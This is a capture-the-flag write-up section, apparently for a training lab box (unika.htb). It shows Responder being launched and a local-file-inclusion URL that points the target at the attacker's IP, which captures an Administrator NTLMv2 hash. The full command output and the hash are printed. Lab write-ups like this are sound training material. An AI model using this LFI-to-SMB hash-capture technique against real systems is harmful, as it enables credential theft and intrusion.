## Capturing a hash
Since there is LFI, there may be a way to capture a hash with the Responder tool.
First, responder is launched. Then, the kali IP is called from unika.htb. The web page doesn't load properly, but the hash is captured.

```
┌──(kali㉿kali)-[~]
└─$ sudo responder -I tun0
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.65]
    Responder IPv6             [dead:beef:2::103f]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-UTYVXK99CTZ]
    Responder Domain Name      [4GFC.LOCAL]
    Responder DCE-RPC Port     [46756]

[+] Listening for events...     

############################################################
# In a web browser: http://unika.htb/?page=//10.10.14.65/NonexistantFile
############################################################
# responder output continues.....
############################################################

[SMB] NTLMv2-SSP Client   : 10.129.81.78
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:ffcf3b7592f7b33d:FB18D4E9A12A6D6AC99E50FA6054078B:010100000000000000C7ADA1C509DC01A9B0D34BAC58CE4B0000000002000800340047004600430001001E00570049004E002D00550054005900560058004B0039003900430054005A0004003400570049004E002D00550054005900560058004B0039003900430054005A002E0034004700460043002E004C004F00430041004C000300140034004700460043002E004C004F00430041004C000500140034004700460043002E004C004F00430041004C000700080000C7ADA1C509DC01060004000200000008003000300000000000000001000000002000008FDC718F278E7779B4355B103329AE8644A15C95BCF1FF8A5F8A8F57129643940A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360035000000000000000000 
```

![[HashCaptured.png]]
